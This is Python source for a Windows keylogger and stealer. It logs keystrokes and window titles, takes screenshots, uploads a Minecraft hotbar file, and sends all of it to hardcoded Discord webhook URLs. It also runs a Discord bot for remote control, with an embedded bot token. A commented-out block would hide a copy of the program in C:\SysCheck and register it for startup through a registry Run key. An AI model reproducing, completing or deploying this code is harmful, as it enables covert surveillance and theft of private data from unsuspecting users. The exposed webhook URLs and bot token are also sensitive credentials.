from core import keylogger, sender
from PIL import ImageGrab
from discord_bot import bot
import time, os, sys, shutil, win32api, win32con, threading

if getattr(sys, 'frozen', False):
	file_path = sys.executable
	type_of = "exe"
elif __file__:
	file_path = __file__
	type_of = "py"

# if os.path.dirname(file_path) != "C:\\SysCheck":
# 	try:
# 		os.mkdir("C:\\SysCheck")
# 	except:
# 		pass
# 	os.system("attrib +s +h /d C:\\SysCheck")
# 	file_startup_path = f"C:\\SysCheck\\SysCheck.{'py' if type_of == 'py' else 'exe'}"
# 	shutil.copy(file_path, file_startup_path)
# 	key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
# 	key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, key_path, 0, win32con.KEY_ALL_ACCESS)
# 	win32api.RegSetValueEx(key, "SysCheck", 0, win32con.REG_SZ, file_startup_path)
# 	win32api.RegCloseKey(key)

keylogger = keylogger.Keylogger()
sender = sender.Sender()

keylogger.start()
sender.webhook_log_url = 'https://discord.com/api/webhooks/1128326661000155248/nDG6sPvn8RitbJwHtDpm0Njy9xkOG_ajJBJfX-Hatd0RYuVymvpdD3IAgReuqj4BGam6?wait?true'
sender.webhook_info_url = 'https://discord.com/api/webhooks/1128643994163871867/B9HL54arPjlrVqR2vAuWCnICe_ngD1k8hMjCxkuIlJhxkZ-cr24gZlgZz5oYZ8sczREJ?wait?true'
sender.send_info()

last_window = ''
last_window = keylogger.log_window_title if last_window == '' else ''
global time_count, time_delay
time_count = time_delay = 10

def StealHotBar():
	# hotbar = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\.minecraft\\hotbar.nbt"
	hotbar = r"D:\TL Legacy\game\hotbar.nbt"
	try:
		sender.send_file(hotbar, '**HotBar Stealer**')
	except:
		sender.send("Not Found HotBar", "HotBar Stealer")
	print("Sent")
StealHotBar()

def Send():
	last_window = keylogger.log_window_title
	snapshot = ImageGrab.grab()
	image_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\sc.jpg"
	snapshot.save(image_path)
	sender.send(keylogger.log_text, keylogger.log_window_title, image_path)
	keylogger.log_text = ''

def LogSend():
	global time_count, time_delay
	while True:
		if keylogger.log_window_title == last_window:
			time_count -= 1
			time.sleep(1)
			if time_count == 0 and keylogger.log_text != '':
				Send()
				time_count = time_delay
			elif time_count == 0 and keylogger.log_text == '':
				time_count = time_delay
		elif keylogger.log_text != '':
			Send()
			time_count = time_delay

def BotControl():
	bot.client.run('MTEyODYxNzQxNTE4MjM4OTM1OA.GsRgnf.P_JNFjMWJQrREknsvyDxxqkMAifoV8IHtoZ43k')

log_send = threading.Thread(target = LogSend, daemon=True)
bot_th = threading.Thread(target = BotControl)
log_send.start()
bot_th.start()
log_send.join()
bot_th.join()
